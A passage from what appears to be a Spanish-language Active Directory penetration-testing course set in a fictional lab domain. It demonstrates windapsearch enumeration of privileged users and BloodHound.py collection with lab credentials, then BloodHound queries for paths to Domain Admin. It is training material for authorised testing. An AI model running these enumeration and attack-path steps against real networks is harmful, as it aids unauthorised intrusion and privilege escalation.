[+] Using Domain Controller at: 172.16.5.5
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=INLANEFREIGHT,DC=LOCAL
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 u:INLANEFREIGHT\forend
[+] Attempting to enumerate all Domain Admins
[+] Using DN: CN=Domain Admins,CN=Users.CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[+]	Found 28 Domain Admins:

cn: Administrator
userPrincipalName: administrator@inlanefreight.local

cn: lab_adm

cn: Matthew Morgan
userPrincipalName: mmorgan@inlanefreight.local

<SNIP>
```

De los resultados en la shell anterior, podemos ver que enumeró 28 usuarios del grupo de administradores de dominio. Toma nota de algunos usuarios que ya hemos visto antes y que pueden incluso tener un hash o una contraseña en texto claro como `wley`, `svc_qualys` y `lab_adm`.

Para identificar más usuarios potenciales, podemos ejecutar la herramienta con la flag `-PU` y verificar usuarios con privilegios elevados que pueden haber pasado desapercibidos. Esta es una gran verificación para los informes ya que informará al cliente de usuarios con privilegios excesivos debido a la membresía de grupo anidada.

### Windapsearch - Privileged Users

```r
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU

[+] Using Domain Controller at: 172.16.5.5
[+] Getting defaultNamingContext from Root DSE
[+]     Found: DC=INLANEFREIGHT,DC=LOCAL
[+] Attempting bind
[+]     ...success! Binded as:
[+]      u:INLANEFREIGHT\forend
[+] Attempting to enumerate all AD privileged users
[+] Using DN: CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[+]     Found 28 nested users for group Domain Admins:

cn: Administrator
userPrincipalName: administrator@inlanefreight.local

cn: lab_adm

cn: Angela Dunn
userPrincipalName: adunn@inlanefreight.local

cn: Matthew Morgan
userPrincipalName: mmorgan@inlanefreight.local

cn: Dorothy Click
userPrincipalName: dclick@inlanefreight.local

<SNIP>

[+] Using DN: CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[+]     Found 3 nested users for group Enterprise Admins:

cn: Administrator
userPrincipalName: administrator@inlanefreight.local

cn: lab_adm

cn: Sharepoint Admin
userPrincipalName: sp-admin@INLANEFREIGHT.LOCAL

<SNIP>
```

Notarás que realizó mutaciones contra nombres comunes de grupos elevados en diferentes idiomas. Esta salida da un ejemplo de los peligros de la membresía de grupo anidada, y esto se hará más evidente cuando trabajemos con gráficos de BloodHound para visualizar esto.

---

## Bloodhound.py

Una vez que tenemos credenciales de dominio, podemos ejecutar el [BloodHound.py](https://github.com/fox-it/BloodHound.py) BloodHound ingestor desde nuestro host de ataque Linux. BloodHound es una de las herramientas más impactantes jamás lanzadas para auditar la seguridad de Active Directory, y es muy beneficiosa para nosotros como testers de penetración. Podemos tomar grandes cantidades de datos que llevarían mucho tiempo revisar y crear representaciones gráficas o "rutas de ataque" de dónde el acceso con un usuario particular puede llevar. A menudo encontramos fallas sutiles en un entorno AD que se habrían pasado por alto sin la capacidad de ejecutar consultas con la herramienta GUI de BloodHound y visualizar problemas. La herramienta usa [graph theory](https://en.wikipedia.org/wiki/Graph_theory) para representar visualmente relaciones y descubrir rutas de ataque que habrían sido difíciles, o incluso imposibles de detectar con otras herramientas. La herramienta consta de dos partes: el [SharpHound collector](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors) escrito en C# para uso en sistemas Windows, o para esta sección, el collector BloodHound.py (también referido como un `ingestor`) y la herramienta GUI de [BloodHound](https://github.com/BloodHoundAD/BloodHound/releases) que nos permite cargar datos recopilados en forma de archivos JSON. Una vez cargados, podemos ejecutar varias consultas preconstruidas o escribir consultas personalizadas utilizando [Cypher language](https://blog.cptjesus.com/posts/introtocypher). La herramienta recopila datos de AD como usuarios, grupos, computadoras, membresía de grupo, GPOs, ACLs, trusts de dominio, acceso de administrador local, sesiones de usuario, propiedades de computadora y usuario, acceso RDP, acceso WinRM, etc.

Inicialmente solo se lanzó con un collector de PowerShell, por lo que tenía que ejecutarse desde un host Windows. Eventualmente, un port de Python (que requiere Impacket, `ldap3` y `dnspython`) fue lanzado por un miembro de la comunidad. Esto ayudó enormemente durante las pruebas de penetración cuando tenemos credenciales de dominio válidas, pero no tenemos derechos para acceder a un host Windows unido al dominio o no tenemos un host de ataque Windows para ejecutar el collector SharpHound. Esto también nos ayuda a no tener que ejecutar el collector desde un host de dominio, lo que podría ser bloqueado o activar alertas (aunque incluso ejecutarlo desde nuestro host de ataque probablemente activará alarmas en entornos bien protegidos).

Ejecutar `bloodhound-python -h` desde nuestro host de ataque Linux mostrará las opciones disponibles.

### BloodHound.py Options

```r
bloodhound-python -h

usage: bloodhound-python [-h] [-c COLLECTIONMETHOD] [-u USERNAME]
                         [-p PASSWORD] [-k] [--hashes HASHES] [-ns NAMESERVER]
                         [--dns-tcp] [--dns-timeout DNS_TIMEOUT] [-d DOMAIN]
                         [-dc HOST] [-gc HOST] [-w WORKERS] [-v]
                         [--disable-pooling] [--disable-autogc] [--zip]

Python based ingestor for BloodHound
For help or reporting issues, visit https://github.com/Fox-IT/BloodHound.py

optional arguments:
  -h, --help            show this help message and exit
  -c COLLECTIONMETHOD, --collectionmethod COLLECTIONMETHOD
                        Which information to collect. Supported: Group,
                        LocalAdmin, Session, Trusts, Default (all previous),
                        DCOnly (no computer connections), DCOM, RDP,PSRemote,
                        LoggedOn, ObjectProps, ACL, All (all except LoggedOn).
                        You can specify more than one by separating them with
                        a comma. (default: Default)
  -u USERNAME, --username USERNAME
                        Username. Format: username[@domain]; If the domain is
                        unspecified, the current domain is used.
  -p PASSWORD, --password PASSWORD
                        Password

  <SNIP>
```

Como podemos ver, la herramienta acepta varios métodos de recopilación con la flag `-c` o `--collectionmethod`. Podemos recuperar datos específicos como sesiones de usuario, usuarios y grupos, propiedades de objetos, ACLs, o seleccionar `all` para recopilar la mayor cantidad de datos posible. Ejecutémoslo de esta manera.

### Executing BloodHound.py

```r
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all 

INFO: Found AD domain: inlanefreight.local
INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
INFO: Found 1 domains
INFO: Found 2 domains in the forest
INFO: Found 564 computers
INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
INFO: Found 2951 users
INFO: Connecting to GC LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
INFO: Found 183 groups
INFO: Found 2 trusts
INFO: Starting computer enumeration with 10 workers

<SNIP>
```

El comando anterior ejecutó Bloodhound.py con el usuario `forend`. Especificamos nuestro nameserver como el Domain Controller con la flag `-ns` y el dominio, INLANEFREIGHt.LOCAL con la flag `-d`. La flag `-c all` le indicó a la herramienta ejecutar todas las comprobaciones. Una vez que el script termine, veremos los archivos de salida en el directorio de trabajo actual en el formato <date_object.json>.

### Viewing the Results

```r
ls

20220307163102_computers.json  20220307163102_domains.json  20220307163102_groups.json  20220307163102_users.json  
```

### Upload the Zip File into the BloodHound GUI

Luego podemos escribir `sudo neo4j start` para iniciar el servicio [neo4j](https://neo4j.com/), encendiendo la base de datos en la que cargaremos los datos y también ejecutaremos consultas Cypher.

A continuación, podemos escribir `bloodhound` desde nuestro host de ataque Linux cuando iniciemos sesión usando `freerdp` para iniciar la aplicación GUI de BloodHound y cargar los datos. Las credenciales están pre-pobladas en el host de ataque Linux, pero si por alguna razón se muestra un prompt de credenciales, usa:

- `user == neo4j` / `pass == HTB_@cademy_stdnt!`.

Una vez que todo lo anterior esté hecho, deberíamos tener la herramienta GUI de BloodHound cargada con una pizarra en blanco. Ahora necesitamos cargar los datos. Podemos cargar cada archivo JSON uno por uno o comprimirlos primero con un comando como `zip -r ilfreight_bh.zip *.json` y cargar el archivo Zip. Hacemos esto haciendo clic en el botón `Upload Data` en el lado derecho de la ventana (flecha verde). Cuando aparezca la ventana del navegador de archivos para seleccionar un archivo, elige el archivo zip (o cada archivo JSON) (flecha roja) y haz clic en `Open`.

### Uploading the Zip File

![image](https://academy.hackthebox.com/storage/modules/143/bh-injest.png)

Ahora que los datos están cargados, podemos usar la pestaña Analysis para ejecutar consultas contra la base de datos. Estas consultas pueden ser personalizadas y específicas para lo que decidas usar [consultas Cypher personalizadas](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/). Hay muchas grandes hojas de referencia para ayudarnos aquí. Discutiremos más sobre consultas Cypher personalizadas en una sección posterior. Como se ve a continuación, podemos usar las consultas `Path Finding` incorporadas en la pestaña `Analysis` en el lado `Left` de la ventana.

### Searching for Relationships

![image](https://academy.hackthebox.com/storage/modules/143/bh-analysis.png)

La consulta elegida para producir el mapa anterior fue `Find Shortest Paths To Domain Admins`. Nos dará cualquier ruta lógica que encuentre a través de relaciones de usuarios/grupos/hosts/ACLs/GPOs, etc., que probablemente nos permitirán escalar a privilegios de Administrador de Dominio o equivalentes. Esto será extremadamente útil al planificar nuestros próximos pasos para el movimiento lateral a través de la red. Tómate un tiempo para experimentar con las diversas características: mira la pestaña `Database Info` después de cargar los datos, busca un nodo como `Domain Users` y, desplázate por todas las opciones bajo la pestaña `Node Info`, revisa las consultas preconstruidas bajo la pestaña `Analysis`, muchas de las cuales son poderosas y pueden encontrar rápidamente varias maneras de tomar el dominio. Finalmente, experimenta con algunas consultas Cypher personalizadas seleccionando algunas interesantes de la hoja de referencia de Cypher vinculada anteriormente, pegándolas en el cuadro `Raw Query` en la parte inferior y presionando enter. También puedes jugar con el menú `Settings` haciendo clic en el icono de engranaje en el lado derecho de la pantalla y ajustando cómo se muestran los nodos y bordes, habilitar el modo de depuración de consultas y habilitar el modo oscuro. A lo largo del resto de este módulo, usaremos BloodHound de varias maneras, pero para un estudio dedicado sobre la herramienta BloodHound, revisa el módulo [Active Directory BloodHound](https://academy.hackthebox.com/course/preview/active-directory-bloodhound).

En la siguiente sección, cubriremos la ejecución del collector SharpHound desde un host Windows unido al dominio y trabajaremos con algunos ejemplos de trabajo con los datos en la GUI de BloodHound.

---

Experimentamos con varias nuevas herramientas para la enumeración de dominios desde un host Linux. La siguiente sección cubrirá varias más herramientas que podemos usar desde un host Windows unido al dominio. Como una nota rápida, si no has revisado el [proyecto WADComs](https://wadcoms.github.io/) aún, definitivamente deberías hacerlo. Es una hoja de referencia interactiva para muchas de las herramientas que cubriremos (y más) en este módulo. Es muy útil cuando no puedes recordar la sintaxis exacta del comando o estás probando una herramienta por primera vez. Vale la pena marcarla y hasta [contribuir](https://wadcoms.github.io/contribute/) en ella.

Ahora, cambiemos de marcha y comencemos a profundizar en el dominio INLANEFREIGHT.LOCAL desde nuestro host de ataque Windows.